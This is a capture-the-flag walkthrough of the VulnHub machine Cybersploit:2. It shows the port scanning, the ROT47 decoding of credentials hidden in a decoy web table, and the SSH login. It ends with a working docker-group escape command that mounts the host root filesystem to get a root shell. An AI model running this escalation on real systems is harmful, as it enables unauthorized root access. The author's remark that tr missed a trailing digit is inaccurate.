# Cybersploit: 2 (VulnHub) — My Walkthrough

**Target:** 10.0.2.19 | **Attacker:** Kali, 10.0.2.3 | **Result:** Root, flag captured

This one had a nice twist on the usual "read the source" trick from Cybersploit:1 — this time the encoded credentials weren't hidden in a comment at all, they were sitting in plain sight inside a decoy table, with the comment only there to tip me off that *something* was encoded somewhere on the page.

---

## 1. Finding the box and checking what's running

I started with a ping sweep to confirm the target's IP, since everything on my NAT Network is DHCP-assigned:

```
sudo nmap -sn 10.0.2.0/24
```

A new host showed up at `10.0.2.19` on an Oracle VirtualBox virtual NIC that wasn't part of my existing roster, so by elimination that had to be Cybersploit:2.

Next, a full port and service scan:

```
nmap -sV -sC -p- 10.0.2.19
```

Only two ports were open — **22/tcp** (OpenSSH 8.0) and **80/tcp** (Apache httpd 2.4.37 on CentOS, page title "CyberSploit2"). With no credentials yet, SSH wasn't usable, so I focused on the web server.

## 2. Finding the hidden credentials

I pulled the raw page source rather than relying on the rendered browser view, since hidden content often lives in the HTML that a browser won't visually surface:

```
curl -s http://10.0.2.19/
```

The page had a visible-looking "credentials" table with 9 rows of usernames/passwords/social handles — clearly a red herring dressed up as legitimate content. But scrolling through, I noticed an empty `<!-- ROT47 -->` comment right before the closing `</body>` tag. That told me *something* on the page was ROT47-encoded, even though the marker comment itself was empty.

I checked every HTML comment on the page just to be thorough:

```
curl -s http://10.0.2.19/ | grep -n '<!--'
```

(I had to use single quotes around `<!--` — zsh interprets a bare `!` inside double quotes as a history-expansion character and throws "event not found" errors.)

Only five real comments existed, and none of them besides the empty ROT47 marker had actual content. That meant the encoded string wasn't hiding in a comment at all — it had to be in the visible table itself.

Looking back at the table, row 4 stood out immediately: unlike the other eight rows (which had normal-looking names and passwords), row 4's username and password fields were full of unusual symbols and mixed-case gibberish — exactly what ROT47 output looks like, since it shifts the *entire* printable ASCII range (33–126), not just letters, so digits and punctuation get scrambled too.

I decoded both fields:

```
echo 'D92:=6?5C2' | tr '!-~' 'P-~!-O'
echo '4J36CDA=@:E`' | tr '!-~' 'P-~!-O'
```

ROT47 is symmetric, so running the same substitution once decodes it. This gave me:

- Username: `shailendra`
- Password: `cybersploit` *(initial read — turned out to be missing a trailing digit; I confirmed the full password against an online ROT47 decoder afterward)*

**Actual password: `cybersploit1`**

## 3. Gaining access

```
ssh shailendra@10.0.2.19
```

Logged in cleanly with `shailendra` / `cybersploit1`.

## 4. Privilege escalation

First, I checked my current privileges:

```
id
sudo -l
```

`id` showed `groups=1001(shailendra),991(docker)` — I was a member of the **docker group**. `sudo -l` immediately confirmed shailendra wasn't in the sudoers file at all, so sudo was a dead end — but docker group membership isn't.

Docker group membership is effectively root-equivalent, because the Docker daemon always runs as root regardless of which user talks to it. Any user in that group can ask the daemon to spin up a container with the host's filesystem mounted inside, then break out of the container's isolation using `chroot`.

I first confirmed Docker was actually usable:

```
docker images
```

No permission errors — Docker access was live. Then the actual escalation:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- `-v /:/mnt` bind-mounts the host's real root filesystem into the container at `/mnt`, with root's privileges (since the daemon is root).
- `--rm` cleans up the container afterward.
- `-it` gives an interactive shell.
- `alpine` is just a lightweight base image to run this in.
- `chroot /mnt sh` changes the shell's apparent root to `/mnt` — which, thanks to the bind mount, is the real host `/`. Since the container process runs as root, this is now a genuine root shell on the actual host machine, not just inside the container.

`whoami` returned `root`, and `ls /` showed the real host's filesystem — confirmed root.

## 5. Capturing the flag

```
find / -iname "*flag*" 2>/dev/null
cat /root/flag.txt
```

`/root/flag.txt` contained an ASCII-art banner: **"Pwned CyberSploit2 POC"** — box complete.

---

## Quick Reference

| Step | Command | What it did |
|---|---|---|
| 1 | `sudo nmap -sn 10.0.2.0/24` | Ping swept the subnet to find the DHCP-assigned target IP |
| 2 | `nmap -sV -sC -p- <ip>` | Full port/service scan — only SSH + HTTP exposed |
| 3 | `curl -s http://<ip>/` | Found a decoy credentials table and an empty `<!-- ROT47 -->` marker comment |
| 4 | `curl -s http://<ip>/ \| grep -n '<!--'` | Confirmed no other comment held content — pointed back to the visible table |
| 5 | `echo '<string>' \| tr '!-~' 'P-~!-O'` | Decoded row 4's ROT47-scrambled username/password |
| 6 | `ssh shailendra@<ip>` | Logged in with the decoded credentials (`shailendra` / `cybersploit1`) |
| 7 | `id`, `sudo -l` | Found docker-group membership; sudo was a dead end |
| 8 | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | Bind-mounted host `/` into a container and chrooted into it for a root shell |
| 9 | `cat /root/flag.txt` | Captured the flag — "Pwned CyberSploit2 POC" |
